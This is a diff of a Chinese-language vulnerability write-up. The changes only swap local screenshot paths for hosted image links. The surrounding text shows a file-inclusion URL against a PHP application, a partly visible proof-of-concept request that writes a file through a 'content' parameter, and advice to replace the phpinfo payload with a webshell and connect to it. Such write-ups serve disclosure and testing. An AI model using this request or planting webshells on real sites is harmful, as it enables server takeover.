@@ -14,7 +14,7 @@ https://xxxx/index.php?a=display&templateFile=README.md
 
 然后我们去到浏览器界面输入README.md回车，就可以发现我们能够成功的包含出这样的一个代码。
 
-![image-20220718140532111](C:\Users\16337\AppData\Roaming\Typora\typora-user-images\image-20220718140532111.png)
+![image-20220718140532111](https://0-bit.oss-cn-beijing.aliyuncs.com/cuer/image-20220718140532111.png)
 
 证明该文件包含漏洞有效
 
@@ -32,7 +32,7 @@ poc为`?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_conten
 
 利用时可将<?php  phpinfo();?>替换为webshell，写入成功后连接。
 
-![image-20220718142724470](C:\Users\16337\AppData\Roaming\Typora\typora-user-images\image-20220718142724470.png)
+![image-20220718142724470](https://0-bit.oss-cn-beijing.aliyuncs.com/cuer/image-20220718142724470.png)
 
 
 
